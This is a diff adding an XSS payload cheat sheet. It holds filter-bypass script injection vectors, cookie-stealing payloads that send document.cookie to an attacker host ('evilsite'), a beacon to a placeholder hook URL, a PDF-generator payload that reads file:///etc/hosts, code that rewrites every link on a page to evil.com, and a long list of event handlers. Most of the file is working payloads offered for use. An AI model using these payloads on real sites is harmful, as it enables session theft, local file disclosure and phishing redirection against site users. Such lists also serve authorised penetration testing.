@@ -1,0 +1,159 @@
+[General XSS] 
+
+"/><img src=x onerror=alert(8)>
+<script src=data:&comma;alert(8)>
+<svg/onload=alert(8)>
+<iframe src="" srcdoc="<script>alert(8)</script>"></iframe>
+<iframe src="javascript:alert(8)"></iframe>
+<svg </onload ="1> (_=prompt,_(8))"">
+"autofocus/onfocus="thr=new XMLHttpRequest();thr.open('GET','//[yourhost]/[yourhook].php?t=&d='+document.domain,true);thr.send(null);"//
+x@x.com<--`<img/src=` onerror=alert("Friendly-XSS")> --!> 
+
+[Special Edition]
+
+<noscript><p title="</noscript><svg/onload=alert(8)>">
+<xmp><p title="</xmp><svg/onload=alert(8)>">
+<noframes><p title="</noframes><svg/onload=alert(8)>">
+<iframe><p title="</iframe><svg/onload=alert(8)>">
+1'"><img/src/onerror=.1|alert``>
+
+[Cookie Stealing] 
+
+<img src=x onerror=this.src='http://evilsite/?c='+document.cookie>
+
+[With this, it will never end the loading of the page]
+ 
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open('GET','https://evilsite/xmlreq?c='+document.cookie,true);
+xmlHttp.send(null);
+
+
+[For PDF Generator, is important to wait for response]
+
+<script>var xmlHttp = new XMLHttpRequest();
+xmlHttp.onload=function(){  document.write('<p><font size="2">'+this.responseText+"</font></p>")};
+xmlHttp.open("GET","file:///etc/hosts");
+xmlHttp.send();
+</script>
+
+use this as a JS source :)!
+
+[Change every link on the page]
+
+Array.from(document.getElementsByTagName("a")).forEach(function(i) {
+  i.href = "https://evil.com";
+});
+
+[You can chain with the img tag and put the entire function on the JS] 
+
+https://vuln.com/?xssparameter=%3Cimg%20src=x%20onerror=Array.from(document.getElementsByTagName(%22a%22)).forEach(function(i){i.href%3d%22https%3a//evil.com%22%3b})%3b%3E
+
+
+[JavaScript Handler]
+
+FSCommand()
+onAnimationsstart()
+onAbort()
+onActivate()
+onAfterPrint()
+onAfterUpdate()
+onBeforeActivate()
+onBeforeCopy()
+onBeforeCut()
+onBeforeDeactivate()
+onBeforeEditFocus()
+onBeforePaste()
+onBeforePrint()
+onBeforeUnload()
+onBeforeUpdate()
+onBegin()
+onBlur()
+onBounce()
+onCellChange()
+onChange()
+onClick()
+onContextMenu()
+onControlSelect()
+onCopy()
+onCut()
+onDataAvailable()
+onDataSetChanged()
+onDataSetComplete()
+onDblClick()
+onDeactivate()
+onDrag()
+onDragEnd()
+onDragLeave()
+onDragEnter()
+onDragOver()
+onDragDrop()
+onDragStart()
+onDrop()
+onEnd()
+onError()
+onErrorUpdate()
+onFilterChange()
+onFinish()
+onFocus()
+onFocusIn()
+onFocusOut()
+onHashChange()
+onHelp()
+onInput()
+onKeyDown()
+onKeyPress()
+onKeyUp()
+onLayoutComplete()
+onLoad()
+onLoseCapture()
+onMediaComplete()
+onMediaError()
+onMessage()
+onMouseDown()
+onMouseEnter()
+onMouseLeave()
+onMouseMove()
+onMouseOut()
+onMouseOver()
+onMouseUp()
+onMouseWheel()
+onMove()
+onMoveEnd()
+onMoveStart()
+onOffline()
+onOnline()
+onOutOfSync()
+onPaste()
+onPause()
+onPopState()
+onProgress()
+onPropertyChange()
+onReadyStateChange()
+onRedo()
+onRepeat()
+onReset()
+onResize()
+onResizeEnd()
+onResizeStart()
+onResume()
+onReverse()
+onRowsEnter()
+onRowExit()
+onRowDelete()
+onRowInserted()
+onScroll()
+onSeek()
+onSelect()
+onSelectionChange()
+onSelectStart()
+onStart()
+onStop()
+onStorage()
+onSyncRestored()
+onSubmit()
+onTimeError()
+onTrackChange()
+onUndo()
+onUnload()
+onURLFlip()
+seekSegmentTime()
